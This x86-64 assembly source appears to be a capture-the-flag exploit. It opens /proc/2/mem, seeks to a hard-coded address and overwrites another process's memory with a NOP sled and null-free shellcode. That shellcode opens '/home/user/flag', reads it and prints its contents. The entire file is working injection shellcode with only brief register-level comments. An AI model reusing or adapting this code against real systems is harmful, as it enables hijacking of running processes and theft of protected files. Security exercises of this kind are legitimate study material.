global _start

section .text

_start:
	jmp pid 

return:
	pop rax
	mov rdx, rax
	add dl, 17
	push rdx
	push rax
	
	; first argument to open()
	pop rdi

	; second argument O_RDWR
	xor rsi, rsi
	add si, 2

	; call open()
	xor rax, rax
	mov al, 2
	syscall

	; first argument to lseek
	mov rdi, rax

	; second argument
	mov rsi, 0x0000000000402232 

	; third argument
	xor rdx, rdx	

	; call lseek()
	xor rax, rax
	add rax, 8
	syscall
	
	; second argument (ze payload) 
	pop rsi

	; third argument, 128 size of buffer
	xor rdx, rdx 
	mov dx, 128 
	
	; call write()
	xor eax, eax
	inc al
	syscall

	; call close
	xor eax, eax
	mov ax, 3
	syscall

loop:
	jmp loop
pid:
	call return
	db "/proc/2/mem", 0, 0, 0, 0, 0, 0

payload:
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	
	; open() first argument 
	mov rsi, 0x0067616c662f7265
	push rsi
	mov rsi, 0x73752f656d6f682f
	push rsi
	mov rdi, rsp

	; second argument
	xor rsi, rsi
	
	; call open
	xor rax, rax
	add ax, 2 
	syscall

	; second argumnet to read
	sub rsp, 2048
	mov rsi, rsp

	; first argument to read
	mov rdi, rax

	; third argument count
	xor rdx, rdx
	add dx, 2048


	; call read
	xor rax, rax
	syscall
	
	; call write to stdout
	xor rax, rax
	inc rax

	xor rdi, rdi
	inc rdi
	syscall

	; call exit(0)
	xor rdi, rdi
	xor rax, rax
	add ax, 60
	syscall



